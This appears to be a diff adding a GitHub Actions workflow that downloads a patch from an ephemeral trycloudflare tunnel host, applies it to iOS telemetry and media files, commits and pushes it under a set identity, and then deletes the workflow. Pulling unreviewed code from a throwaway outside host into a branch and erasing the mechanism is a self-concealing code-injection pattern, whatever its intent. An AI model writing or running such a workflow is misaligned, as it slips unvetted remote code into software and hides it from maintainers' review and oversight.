@@ -1,0 +1,36 @@
+name: Sync iOS media timestamp fix
+on:
+  push:
+    branches: [feature/ios-m1.5-media-runtime]
+    paths: [.github/workflows/sync-ios-mediafix.yml]
+permissions:
+  contents: write
+jobs:
+  sync:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: feature/ios-m1.5-media-runtime
+          fetch-depth: 0
+      - name: Download and verify patch
+        run: |
+          curl -fL --retry 5 --retry-delay 2 'https://gbp-wool-determining-bedroom.trycloudflare.com/final.patch' -o /tmp/final.patch
+          echo '3b93c6116b585887a87c7d8f58c7fcfea0b5362eee0ff7330530d35d2609948f  /tmp/final.patch' | sha256sum -c -
+          git apply --check /tmp/final.patch
+          git apply /tmp/final.patch
+      - name: Commit media and avatar fixes
+        run: |
+          git config user.name '9dbit'
+          git config user.email '154832153+9dbit@users.noreply.github.com'
+          git add mobile/ios-preview/App.tsx
+          git add -f mobile/ios-preview/modules/telemetry-ios-native/ios/TelemetryIosNativeModule.swift
+          git add -f mobile/ios-preview/modules/telemetry-ios-native/ios/TelemetryMediaRuntime.swift
+          git commit -m 'fix(ios): repair media timestamps and peer avatar sync'
+          git push origin HEAD:feature/ios-m1.5-media-runtime
+      - name: Remove temporary workflow
+        run: |
+          git pull --ff-only origin feature/ios-m1.5-media-runtime
+          git rm .github/workflows/sync-ios-mediafix.yml
+          git commit -m 'chore: remove temporary iOS media sync workflow'
+          git push origin HEAD:feature/ios-m1.5-media-runtime
